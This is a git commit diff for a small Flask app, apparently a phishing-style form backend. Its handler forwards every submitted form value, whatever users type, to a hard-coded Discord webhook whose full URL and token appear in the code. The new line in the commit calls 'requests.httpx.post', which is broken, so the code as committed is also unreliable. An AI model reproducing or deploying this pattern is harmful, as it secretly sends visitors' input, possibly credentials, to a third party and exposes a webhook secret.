1cfecfcd377c2fa871e837beca7c4870d6a00225
BuildTools <unconfigured@null.spigotmc.org>
2022-11-05 22:02:54 +0200

    changed modules

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 from flask import Flask, request, render_template
 import json
-import httpx
+import requests
 app = Flask(__name__)
 
 @app.route("/", methods=['GET', 'POST'])
@@ -9,7 +9,7 @@ def hello_world():
         a = request.form
         for item, value in a.items():
             print(f"{item}: {value}")
-            httpx.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
+            requests.httpx.post("https://discord.com/api/webhooks/1038012726305366076/sr1YKbFZsi2t20YiuPubRFDFk3uHVyqeQ_zmIGiMxcZBKQc2pY5PDsN0LHufeI7dHUnM", data={"content": f"{value}"})
     
     return render_template('base.html')
 
